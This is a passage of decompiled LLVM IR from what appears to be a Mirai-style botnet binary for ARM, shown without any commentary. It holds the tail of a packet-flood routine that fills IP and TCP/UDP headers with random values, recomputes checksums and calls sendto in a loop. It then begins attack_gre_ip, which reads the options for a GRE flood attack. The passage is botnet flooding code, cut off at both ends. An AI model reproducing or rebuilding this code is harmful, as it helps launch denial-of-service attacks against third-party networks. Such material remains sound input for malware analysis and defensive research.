  %v1_8df4 = phi i32 [ %v1_8df4.pre, %dec_label_pc_8f98.dec_label_pc_8df0_crit_edge ], [ %v1_8de8, %dec_label_pc_8de4 ]
  store i32 %v3_8b4c, i32* %r3.global-to-local, align 4
  %v9_8df4 = icmp eq i32 %v3_8b4c, %v1_8df4
  store i1 %v9_8df4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_8df4, label %dec_label_pc_8fd4, label %dec_label_pc_8dfc

dec_label_pc_8dfc:                                ; preds = %dec_label_pc_8fc0, %dec_label_pc_8df0
  store i32 %v1_8b40, i32* @r4, align 4
  store i1 %v2_8fdc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_8fdc, label %dec_label_pc_8ff0, label %.thread11

.thread11:                                        ; preds = %dec_label_pc_8dfc
  %v1_8e04 = load i32, i32* @r5, align 4
  %v2_8e04 = add i32 %v1_8e04, 16
  %v3_8e04 = inttoptr i32 %v2_8e04 to i32*
  %v4_8e04 = load i32, i32* %v3_8e04, align 4
  store i32 %v4_8e04, i32* %r3.global-to-local, align 4
  %v2_8e08 = load i32, i32* @r6, align 4
  %v3_8e08 = add i32 %v2_8e08, 16
  %v4_8e08 = inttoptr i32 %v3_8e08 to i32*
  store i32 %v4_8e04, i32* %v4_8e08, align 4
  br label %dec_label_pc_8e10

dec_label_pc_8e10:                                ; preds = %bb86, %.thread11, %dec_label_pc_8ff0
  %v0_8e10 = call i32 @rand_next()
  store i32 %v0_8e10, i32* %r0.global-to-local, align 4
  store i32 %v0_8e10, i32* %stack_var_-48, align 4
  %v0_8e18 = call i32 @rand_next()
  store i32 %v0_8e18, i32* %r0.global-to-local, align 4
  store i32 %v0_8e18, i32* %stack_var_-52, align 4
  %v0_8e20 = call i32 @rand_next()
  store i32 %v2_8e24, i32* %r1.global-to-local, align 4
  store i32 %v0_8e20, i32* %stack_var_-56, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v0_8e30 = load i32, i32* @r7, align 4
  store i32 %v0_8e30, i32* %r0.global-to-local, align 4
  %v3_8e34 = call i32 @util_memcpy(i32 %v0_8e30, i32 %v2_8e24, i32 4)
  %v0_8e38 = load i32, i32* @r7, align 4
  %v1_8e38 = add i32 %v0_8e38, 6
  store i32 %v1_8e38, i32* %r0.global-to-local, align 4
  store i32 %v2_8e3c, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v3_8e44 = call i32 @util_memcpy(i32 %v1_8e38, i32 %v2_8e3c, i32 4)
  %v0_8e48 = load i32, i32* @r7, align 4
  %v1_8e48 = add i32 %v0_8e48, 4
  store i32 %v1_8e48, i32* %r0.global-to-local, align 4
  store i32 %v2_8e4c, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v3_8e54 = call i32 @util_memcpy(i32 %v1_8e48, i32 %v2_8e4c, i32 2)
  store i32 %v2_8e58, i32* %r1.global-to-local, align 4
  %v0_8e5c = load i32, i32* @r7, align 4
  %v1_8e5c = add i32 %v0_8e5c, 10
  store i32 %v1_8e5c, i32* %r0.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v3_8e64 = call i32 @util_memcpy(i32 %v1_8e5c, i32 %v2_8e58, i32 2)
  store i32 %v3_8e64, i32* %r0.global-to-local, align 4
  store i32 %v1_8ab4, i32* %r1.global-to-local, align 4
  store i1 %v2_8e6c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_8e6c, label %dec_label_pc_8e74, label %dec_label_pc_8ffc

dec_label_pc_8e74:                                ; preds = %dec_label_pc_8e10, %dec_label_pc_8ffc
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_8e78 = load i32, i32* @r5, align 4
  %v3_8e78 = add i32 %v2_8e78, 10
  %v4_8e78 = inttoptr i32 %v3_8e78 to i16*
  store i16 0, i16* %v4_8e78, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_8e80 = load i32, i32* @r5, align 4
  store i32 %v0_8e80, i32* @r0, align 4
  %v2_8e84 = call i32 @checksum_generic(i32 %v0_8e80, i32 20)
  %v3_8e84 = trunc i32 %v2_8e84 to i16
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_8e8c = load i32, i32* @r5, align 4
  %v4_8e8c = add i32 %v3_8e8c, 10
  %v5_8e8c = inttoptr i32 %v4_8e8c to i16*
  store i16 %v3_8e84, i16* %v5_8e8c, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_8e94 = load i32, i32* %r3.global-to-local, align 4
  %v1_8e94 = trunc i32 %v0_8e94 to i16
  %v2_8e94 = load i32, i32* @r6, align 4
  %v3_8e94 = add i32 %v2_8e94, 10
  %v4_8e94 = inttoptr i32 %v3_8e94 to i16*
  store i16 %v1_8e94, i16* %v4_8e94, align 2
  %v0_8e98 = load i32, i32* @r6, align 4
  store i32 %v0_8e98, i32* @r0, align 4
  %v2_8e9c = call i32 @checksum_generic(i32 %v0_8e98, i32 20)
  %v3_8e9c = trunc i32 %v2_8e9c to i16
  store i32 %v2_8e9c, i32* %r0.global-to-local, align 4
  %v3_8ea0 = load i32, i32* @r6, align 4
  %v4_8ea0 = add i32 %v3_8ea0, 10
  %v5_8ea0 = inttoptr i32 %v4_8ea0 to i16*
  store i16 %v3_8e9c, i16* %v5_8ea0, align 2
  store i32 0, i32* @r4, align 4
  %v0_8ea8 = load i32, i32* @r8, align 4
  store i32 %v0_8ea8, i32* @r1, align 4
  %v1_8eac = add i32 %v0_8ea8, 4
  %v2_8eac = inttoptr i32 %v1_8eac to i16*
  %v3_8eac = load i16, i16* %v2_8eac, align 2
  %v4_8eac = zext i16 %v3_8eac to i32
  store i32 %v4_8eac, i32* %r2.global-to-local, align 4
  store i32 %stack_var_-136.0.ph, i32* %r3.global-to-local, align 4
  %v3_8eb4 = add i32 %v0_8ea8, 6
  %v4_8eb4 = inttoptr i32 %v3_8eb4 to i16*
  store i16 0, i16* %v4_8eb4, align 2
  %v0_8eb8 = load i32, i32* @r6, align 4
  store i32 %v0_8eb8, i32* %r0.global-to-local, align 4
  %v4_8ebc = call i32 @checksum_tcpudp(i32 %v0_8eb8, i32 %v0_8ea8, i32 %v4_8eac, i32 %stack_var_-136.0.ph)
  %v5_8ebc = trunc i32 %v4_8ebc to i16
  store i32 %v4_8ebc, i32* %r0.global-to-local, align 4
  %v3_8ec0 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_8ec0, i32* %r2.global-to-local, align 4
  %v3_8ec4 = mul i32 %v3_8ec0, 32
  store i32 %v3_8ec4, i32* %r3.global-to-local, align 4
  %v0_8ec8 = load i32, i32* @r5, align 4
  %v1_8ec8 = add i32 %v0_8ec8, 16
  %v2_8ec8 = inttoptr i32 %v1_8ec8 to i32*
  %v3_8ec8 = load i32, i32* %v2_8ec8, align 4
  %v5_8ecc = mul i32 %v3_8ec0, 24
  store i32 %v5_8ecc, i32* %r3.global-to-local, align 4
  %v1_8ed0 = load i32, i32* @sb, align 4
  %v2_8ed0 = add i32 %v1_8ed0, %v5_8ecc
  store i32 %v2_8ed0, i32* @lr, align 4
  %v2_8ed4 = add i32 %v2_8ed0, 4
  %v3_8ed4 = inttoptr i32 %v2_8ed4 to i32*
  store i32 %v3_8ec8, i32* %v3_8ed4, align 4
  store i32 2, i32* %r1.global-to-local, align 4
  %v3_8edc = load i32, i32* @r8, align 4
  %v4_8edc = add i32 %v3_8edc, 6
  %v5_8edc = inttoptr i32 %v4_8edc to i16*
  store i16 %v5_8ebc, i16* %v5_8edc, align 2
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_8ee4 = load i32, i32* %r1.global-to-local, align 4
  %v1_8ee4 = trunc i32 %v0_8ee4 to i16
  %v2_8ee4 = load i32, i32* %r3.global-to-local, align 4
  %v3_8ee4 = load i32, i32* @sb, align 4
  %v4_8ee4 = add i32 %v3_8ee4, %v2_8ee4
  %v5_8ee4 = inttoptr i32 %v4_8ee4 to i16*
  store i16 %v1_8ee4, i16* %v5_8ee4, align 2
  %v0_8ee8 = load i32, i32* @r4, align 4
  %v1_8ee8 = trunc i32 %v0_8ee8 to i16
  %v2_8ee8 = load i32, i32* @lr, align 4
  %v3_8ee8 = add i32 %v2_8ee8, 2
  %v4_8ee8 = inttoptr i32 %v3_8ee8 to i16*
  store i16 %v1_8ee8, i16* %v4_8ee8, align 2
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_8ef0 = load i32, i32* @r5, align 4
  store i32 %v0_8ef0, i32* %r1.global-to-local, align 4
  store i32 %v3_8afc, i32* %r0.global-to-local, align 4
  store i32 %stack_var_-132.0.ph, i32* %r2.global-to-local, align 4
  %v0_8efc = load i32, i32* @lr, align 4
  %v0_8f00 = load i32, i32* %ip.global-to-local, align 4
  %v6_8f04 = call i32 @__libc_sendto(i32 %v3_8afc, i32 %v0_8ef0, i32 %stack_var_-132.0.ph, i32 16384, i32 %v0_8efc, i32 %v0_8f00)
  %v3_8f08 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_8f08, i32* %r3.global-to-local, align 4
  %v1_8f0c = add i32 %v3_8f08, 1
  store i32 %v1_8f0c, i32* %r0.global-to-local, align 4
  %v1_8f10 = load i32, i32* @sl, align 4
  %v9_8f10 = icmp eq i32 %v1_8f0c, %v1_8f10
  store i1 %v9_8f10, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_8f0c, i32* %stack_var_-44, align 4
  %v6_8f18 = icmp slt i32 %v1_8f0c, %v1_8f10
  br i1 %v6_8f18, label %dec_label_pc_8d9c, label %dec_label_pc_8d88

dec_label_pc_8f20:                                ; preds = %dec_label_pc_8d9c
  %v1_8f20 = add i32 %v2_8da4, 16
  %v2_8f20 = inttoptr i32 %v1_8f20 to i32*
  %v3_8f20 = load i32, i32* %v2_8f20, align 4
  store i32 %v3_8f20, i32* %r4.global-to-local, align 4
  %v0_8f24 = call i32 @rand_next()
  store i32 %v0_8f24, i32* %r0.global-to-local, align 4
  %v3_8f28 = load i32, i32* %stack_var_-44, align 4
  %v5_8f30 = mul i32 %v3_8f28, 24
  %v0_8f34 = load i32, i32* %r4.global-to-local, align 4
  %v1_8f34 = and i32 %v0_8f34, 16711680
  store i32 %v1_8f34, i32* %ip.global-to-local, align 4
  %v3_8f38 = udiv i32 %v0_8f34, 16777216
  %v4_8f3c = udiv i32 %v1_8f34, 256
  %v5_8f3c = or i32 %v4_8f3c, %v3_8f38
  store i32 %v5_8f3c, i32* %r2.global-to-local, align 4
  %v1_8f40 = load i32, i32* @sb, align 4
  %v2_8f40 = add i32 %v1_8f40, %v5_8f30
  store i32 %v2_8f40, i32* %r1.global-to-local, align 4
  %v1_8f44 = and i32 %v0_8f34, 65280
  store i32 %v1_8f44, i32* %r3.global-to-local, align 4
  %v1_8f48 = add i32 %v2_8f40, 20
  %v2_8f48 = inttoptr i32 %v1_8f48 to i8*
  %v3_8f48 = load i8, i8* %v2_8f48, align 1
  %v4_8f48 = zext i8 %v3_8f48 to i32
  store i32 %v4_8f48, i32* %ip.global-to-local, align 4
  %v5_8f50 = call i32 @llvm.bswap.i32(i32 %v0_8f34)
  %v7_8f54 = lshr i32 %v0_8f24, %v4_8f48
  %v8_8f54 = add i32 %v7_8f54, %v5_8f50
  store i32 %v8_8f54, i32* %r2.global-to-local, align 4
  %v1_8f58 = and i32 %v8_8f54, 16711680
  store i32 %v1_8f58, i32* %r0.global-to-local, align 4
  store i32 %v6_8ae8, i32* %r1.global-to-local, align 4
  %v5_8f70 = call i32 @llvm.bswap.i32(i32 %v8_8f54)
  store i32 %v5_8f70, i32* %r3.global-to-local, align 4
  store i1 %v7_8dcc, i1* %cpsr_z.global-to-local, align 1
  %v1_8f78 = load i32, i32* @r5, align 4
  %v2_8f78 = add i32 %v1_8f78, 16
  %v3_8f78 = inttoptr i32 %v2_8f78 to i32*
  store i32 %v5_8f70, i32* %v3_8f78, align 4
  br i1 %v2_8dcc, label %dec_label_pc_8f80, label %dec_label_pc_8dd4

dec_label_pc_8f80:                                ; preds = %dec_label_pc_8f20, %dec_label_pc_8dc8
  %v0_8f80 = call i32 @rand_next()
  store i32 %v0_8f80, i32* %r0.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_10000.57 to i32), i32 -1), i32* %r4.global-to-local, align 4
  %v0_8f8c = load i32, i32* @fp, align 4
  %v9_8f8c = icmp eq i32 %v0_8f8c, add (i32 ptrtoint (i32* @global_var_10000.57 to i32), i32 -1)
  store i1 %v9_8f8c, i1* %cpsr_z.global-to-local, align 1
  %v1_8f90 = load i32, i32* @r5, align 4
  %v2_8f90 = add i32 %v1_8f90, 12
  %v3_8f90 = inttoptr i32 %v2_8f90 to i32*
  store i32 %v0_8f80, i32* %v3_8f90, align 4
  br i1 %v9_8f8c, label %dec_label_pc_8f98, label %dec_label_pc_8f80.dec_label_pc_8de4_crit_edge

dec_label_pc_8f80.dec_label_pc_8de4_crit_edge:    ; preds = %dec_label_pc_8f80
  %v1_8de8.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_8de4

dec_label_pc_8f98:                                ; preds = %dec_label_pc_8f80, %dec_label_pc_8dd4
  %v0_8f98 = call i32 @rand_next()
  %v3_8fa0 = urem i32 %v0_8f98, 65536
  store i32 %v3_8fa0, i32* %r0.global-to-local, align 4
  store i32 %v3_8b48, i32* %r2.global-to-local, align 4
  %v1_8fac = sub nsw i32 999, %v3_8fa0
  store i32 %v1_8fac, i32* %r3.global-to-local, align 4
  %v1_8fb0 = load i32, i32* %r4.global-to-local, align 4
  %v9_8fb0 = icmp eq i32 %v3_8b48, %v1_8fb0
  store i1 %v9_8fb0, i1* %cpsr_z.global-to-local, align 1
  %v1_8fb4 = trunc i32 %v0_8f98 to i16
  %v2_8fb4 = load i32, i32* @r5, align 4
  %v3_8fb4 = add i32 %v2_8fb4, 4
  %v4_8fb4 = inttoptr i32 %v3_8fb4 to i16*
  store i16 %v1_8fb4, i16* %v4_8fb4, align 2
  %v0_8fb8 = load i32, i32* %r3.global-to-local, align 4
  %v1_8fb8 = trunc i32 %v0_8fb8 to i16
  %v2_8fb8 = load i32, i32* @r6, align 4
  %v3_8fb8 = add i32 %v2_8fb8, 4
  %v4_8fb8 = inttoptr i32 %v3_8fb8 to i16*
  store i16 %v1_8fb8, i16* %v4_8fb8, align 2
  br i1 %v9_8fb0, label %dec_label_pc_8fc0, label %dec_label_pc_8f98.dec_label_pc_8df0_crit_edge

dec_label_pc_8f98.dec_label_pc_8df0_crit_edge:    ; preds = %dec_label_pc_8f98
  %v1_8df4.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_8df0

dec_label_pc_8fc0:                                ; preds = %dec_label_pc_8f98, %dec_label_pc_8de4
  %v0_8fc0 = call i32 @rand_next()
  %v1_8fc0 = trunc i32 %v0_8fc0 to i16
  store i32 %v0_8fc0, i32* %r0.global-to-local, align 4
  store i32 %v3_8b4c, i32* %r3.global-to-local, align 4
  %v1_8fc8 = load i32, i32* %r4.global-to-local, align 4
  %v9_8fc8 = icmp eq i32 %v3_8b4c, %v1_8fc8
  store i1 %v9_8fc8, i1* %cpsr_z.global-to-local, align 1
  %v3_8fcc = load i32, i32* @r5, align 4
  %v4_8fcc = add i32 %v3_8fcc, 58
  %v5_8fcc = inttoptr i32 %v4_8fcc to i16*
  store i16 %v1_8fc0, i16* %v5_8fcc, align 2
  br i1 %v9_8fc8, label %dec_label_pc_8fd4, label %dec_label_pc_8dfc

dec_label_pc_8fd4:                                ; preds = %dec_label_pc_8fc0, %dec_label_pc_8df0
  %v0_8fd4 = call i32 @rand_next()
  %v1_8fd4 = trunc i32 %v0_8fd4 to i16
  store i32 %v0_8fd4, i32* %r0.global-to-local, align 4
  store i32 %v1_8b40, i32* @r4, align 4
  store i1 %v2_8fdc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_8fdc, label %.thread31, label %bb86

.thread31:                                        ; preds = %dec_label_pc_8fd4
  %v3_8fe432 = load i32, i32* @r8, align 4
  %v4_8fe433 = add i32 %v3_8fe432, 2
  %v5_8fe434 = inttoptr i32 %v4_8fe433 to i16*
  store i16 %v1_8fd4, i16* %v5_8fe434, align 2
  br label %dec_label_pc_8ff0

bb86:                                             ; preds = %dec_label_pc_8fd4
  %v1_8fe0 = load i32, i32* @r5, align 4
  %v2_8fe0 = add i32 %v1_8fe0, 16
  %v3_8fe0 = inttoptr i32 %v2_8fe0 to i32*
  %v4_8fe0 = load i32, i32* %v3_8fe0, align 4
  store i32 %v4_8fe0, i32* %r3.global-to-local, align 4
  %v3_8fe4 = load i32, i32* @r8, align 4
  %v4_8fe4 = add i32 %v3_8fe4, 2
  %v5_8fe4 = inttoptr i32 %v4_8fe4 to i16*
  store i16 %v1_8fd4, i16* %v5_8fe4, align 2
  %v1_8fe8 = load i32, i32* %r3.global-to-local, align 4
  %v2_8fe8 = load i32, i32* @r6, align 4
  %v3_8fe8 = add i32 %v2_8fe8, 16
  %v4_8fe8 = inttoptr i32 %v3_8fe8 to i32*
  store i32 %v1_8fe8, i32* %v4_8fe8, align 4
  br label %dec_label_pc_8e10

dec_label_pc_8ff0:                                ; preds = %.thread31, %dec_label_pc_8dfc
  %v0_8ff0 = call i32 @rand_next()
  store i32 %v0_8ff0, i32* %r0.global-to-local, align 4
  %v1_8ff4 = load i32, i32* @r6, align 4
  %v2_8ff4 = add i32 %v1_8ff4, 16
  %v3_8ff4 = inttoptr i32 %v2_8ff4 to i32*
  store i32 %v0_8ff0, i32* %v3_8ff4, align 4
  br label %dec_label_pc_8e10

dec_label_pc_8ffc:                                ; preds = %dec_label_pc_8e10
  %v0_8ffc = load i32, i32* @r8, align 4
  %v1_8ffc = add i32 %v0_8ffc, 8
  store i32 %v1_8ffc, i32* %r0.global-to-local, align 4
  store i32 %v6_8a94, i32* %r1.global-to-local, align 4
  %v2_9004 = inttoptr i32 %v1_8ffc to i16*
  %v3_9004 = call i32 @rand_str(i16* %v2_9004, i32 %v6_8a94)
  store i32 %v3_9004, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_8e74

dec_label_pc_900c:                                ; preds = %dec_label_pc_8b0c
  store i32 %v3_8afc, i32* %r0.global-to-local, align 4
  %v1_9010 = call i32 @__GI___libc_close(i32 %v3_8afc)
  store i32 %v1_9010, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9014

dec_label_pc_9014:                                ; preds = %entry, %dec_label_pc_900c
  %v1_901c = phi i32 [ %v3_8afc, %entry ], [ %v1_9010, %dec_label_pc_900c ]
  store i32 %v3_89ac, i32* %r4.global-to-local, align 4
  store i32 %v6_89ac, i32* %r5.global-to-local, align 4
  store i32 %v24_89ac, i32* %fp.global-to-local, align 4
  ret i32 %v1_901c

dec_label_pc_9020:                                ; preds = %dec_label_pc_8b34
  %v1_9028 = add i32 %v6_8a94, 8
  store i32 %v1_9028, i32* %r1.global-to-local, align 4
  %v1_902c = add i32 %v6_8a94, 66
  store i32 %v1_902c, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_8d88.preheader

; uselistorder directives
  uselistorder i32 %v1_902c, { 1, 0 }
  uselistorder i32 %v1_9028, { 1, 0 }
  uselistorder i16 %v1_8fd4, { 1, 0 }
  uselistorder i32 %v0_8fd4, { 1, 0 }
  uselistorder i32 %v0_8fc0, { 1, 0 }
  uselistorder i32 %v3_8fa0, { 1, 0 }
  uselistorder i32 %v0_8f98, { 1, 0 }
  uselistorder i32 %v5_8f70, { 1, 0 }
  uselistorder i32 %v0_8f34, { 1, 2, 0, 3 }
  uselistorder i32 %v1_8f10, { 1, 2, 0 }
  uselistorder i32 %v1_8f0c, { 2, 0, 3, 4, 1 }
  uselistorder i32 %v3_8ec0, { 1, 0, 2 }
  uselistorder i32 %v4_8ebc, { 1, 0 }
  uselistorder i32 %v0_8ea8, { 1, 0, 2, 3 }
  uselistorder i32 %v2_8e9c, { 1, 0 }
  uselistorder i32 %v7_8db0, { 2, 1, 0, 3 }
  uselistorder i1 %v7_8dcc, { 2, 1, 0 }
  uselistorder i1 %v2_8fdc, { 2, 3, 1, 0 }
  uselistorder i32 %v0_8d20, { 1, 0, 2 }
  uselistorder i32 %v3_8b9c, { 1, 0 }
  uselistorder i32 %v3_8b80, { 1, 2, 0 }
  uselistorder i32 %v1_8b7c, { 1, 0 }
  uselistorder i32 %v1_8b40, { 3, 2, 4, 0, 1 }
  uselistorder i32 %v0_8b3c, { 1, 0, 3, 2 }
  uselistorder i32 %v0_8b38, { 1, 0, 2, 3 }
  uselistorder i32 %v0_8b34, { 1, 0, 2, 3 }
  uselistorder i1 %v7_8b2c, { 1, 0 }
  uselistorder i1 %v7_8b00, { 1, 0 }
  uselistorder i32 %v3_8afc, { 1, 3, 4, 5, 6, 2, 0, 7 }
  uselistorder i32 %v6_8ae8, { 5, 3, 0, 4, 1, 2 }
  uselistorder i32 %v1_8ab4, { 1, 2, 3, 0 }
  uselistorder i32 %v6_8a94, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_8a48, { 1, 2, 0 }
  uselistorder i32 %v1_8a24, { 3, 2, 1, 0 }
  uselistorder i32 %v6_8a1c, { 1, 0 }
  uselistorder i32 %v6_89e0, { 2, 1, 3, 0 }
  uselistorder i32 %v2_89c8, { 0, 4, 1, 3, 2, 5 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9 }
  uselistorder i32* %r4.global-to-local, { 0, 5, 7, 6, 1, 2, 3, 4, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 1, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 31, 30, 32, 33, 34, 35, 36, 37, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 24, 23, 25, 27, 26, 28, 29, 31, 30, 32, 33, 35, 34, 37, 36, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 1, 4, 3, 5, 7, 8, 6, 10, 9, 12, 11, 13, 15, 14, 16, 18, 17, 19, 20, 21, 22, 24, 23, 27, 25, 26, 30, 28, 29, 31, 33, 32, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 0 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_9014, { 1, 0 }
  uselistorder label %dec_label_pc_8e74, { 1, 0 }
  uselistorder label %dec_label_pc_8e10, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8d88, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8d88.preheader, { 1, 0 }
  uselistorder label %bb85, { 1, 0 }
  uselistorder label %bb84, { 1, 0 }
  uselistorder label %.thread25, { 1, 0 }
}

define i32 @attack_gre_ip(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-44 = alloca i32, align 4
  %v3_9040 = load i32, i32* @r4, align 4
  %v6_9040 = load i32, i32* @r5, align 4
  %v24_9040 = load i32, i32* @fp, align 4
  store i32 %arg2, i32* @sb, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg1, i32* @sl, align 4
  %v2_905c = call i32 @calloc(i32 %arg1, i32 4)
  %v0_9060 = load i32, i32* @r5, align 4
  store i32 %v0_9060, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_9070 = load i32, i32* @r4, align 4
  %v5_9074 = inttoptr i32 %v0_9060 to i32*
  %v6_9074 = call i32 @attack_get_opt_int(i32 %v0_9070, i32* %v5_9074, i32 2, i32 0, i32 %v2_905c)
  %v1_9080 = urem i32 %v6_9074, 256
  store i32 %v1_9080, i32* %ip.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_10000.57 to i32), i32 -1), i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_908c = load i32, i32* @r5, align 4
  store i32 %v0_908c, i32* %r1.global-to-local, align 4
  %v0_9090 = load i32, i32* @r4, align 4
  %v5_9094 = trunc i32 %v6_9074 to i8
  %v6_9098 = inttoptr i32 %v0_908c to i32*
  %v7_9098 = call i32 @attack_get_opt_int(i32 %v0_9090, i32* %v6_9098, i32 3, i32 add (i32 ptrtoint (i32* @global_var_10000.57 to i32), i32 -1), i32 %v6_9074)
  %v0_909c = load i32, i32* @r5, align 4
  store i32 %v0_909c, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v7_9098, i32* %fp.global-to-local, align 4
  %v0_90ac = load i32, i32* @r4, align 4
  %v5_90b0 = inttoptr i32 %v0_909c to i32*
  %v6_90b0 = call i32 @attack_get_opt_int(i32 %v0_90ac, i32* %v5_90b0, i32 4, i32 64, i32 ptrtoint (i32* @0 to i32))
  %v1_90b8 = urem i32 %v6_90b0, 256
  store i32 %v1_90b8, i32* %ip.global-to-local, align 4
  %v0_90bc = load i32, i32* @r5, align 4
  store i32 %v0_90bc, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_90c8 = load i32, i32* @r4, align 4
  %v6_90d0 = inttoptr i32 %v0_90bc to i32*
  %v7_90d0 = call i32 @attack_get_opt_int(i32 %v0_90c8, i32* %v6_90d0, i32 5, i32 1, i32 %v1_90b8)
  %v1_90dc = urem i32 %v7_90d0, 256
  store i32 %v1_90dc, i32* %ip.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_10000.57 to i32), i32 -1), i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_90e8 = load i32, i32* @r5, align 4
  store i32 %v0_90e8, i32* %r1.global-to-local, align 4
  %v0_90ec = load i32, i32* @r4, align 4
  %v5_90f4 = inttoptr i32 %v0_90e8 to i32*
  %v6_90f4 = call i32 @attack_get_opt_int(i32 %v0_90ec, i32* %v5_90f4, i32 6, i32 add (i32 ptrtoint (i32* @global_var_10000.57 to i32), i32 -1), i32 %v1_90dc)
  %v0_90fc = load i32, i32* @r5, align 4
  store i32 %v0_90fc, i32* %r1.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_10000.57 to i32), i32 -1), i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 %v6_90f4, i32* @r8, align 4
  %v0_910c = load i32, i32* @r4, align 4
  %v5_9110 = inttoptr i32 %v0_90fc to i32*
  %v6_9110 = call i32 @attack_get_opt_int(i32 %v0_910c, i32* %v5_9110, i32 7, i32 add (i32 ptrtoint (i32* @global_var_10000.57 to i32), i32 -1), i32 ptrtoint (i32* @0 to i32))
  %v0_9114 = load i32, i32* @r5, align 4
  store i32 %v0_9114, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  store i32 %v6_9110, i32* @r7, align 4
  %v0_9124 = load i32, i32* @r4, align 4
  %v5_9128 = inttoptr i32 %v0_9114 to i32*
  %v6_9128 = call i32 @attack_get_opt_int(i32 %v0_9124, i32* %v5_9128, i32 0, i32 512, i32 ptrtoint (i32* @0 to i32))
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_9138 = load i32, i32* @r5, align 4
  store i32 %v0_9138, i32* %r1.global-to-local, align 4
  %v0_913c = load i32, i32* @r4, align 4
  %v5_9140 = inttoptr i32 %v0_9138 to i32*
  %v6_9140 = call i32 @attack_get_opt_int(i32 %v0_913c, i32* %v5_9140, i32 1, i32 1, i32 ptrtoint (i32* @0 to i32))
  %v1_9148 = urem i32 %v6_9140, 256
  store i32 %v1_9148, i32* %ip.global-to-local, align 4
  %v0_914c = load i32, i32* @r5, align 4
  store i32 %v0_914c, i32* %r1.global-to-local, align 4
  store i32 19, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_9158 = load i32, i32* @r4, align 4
  %v5_9160 = inttoptr i32 %v0_914c to i32*
  %v6_9160 = call i32 @attack_get_opt_int(i32 %v0_9158, i32* %v5_9160, i32 19, i32 0, i32 %v1_9148)
  %v0_9168 = load i32, i32* @r5, align 4
  store i32 %v0_9168, i32* %r1.global-to-local, align 4
  %v2_916c = load i32, i32* @global_var_24f80.59, align 4
  store i32 %v2_916c, i32* %r3.global-to-local, align 4
  store i32 %v6_9160, i32* @r6, align 4
  store i32 25, i32* %r2.global-to-local, align 4
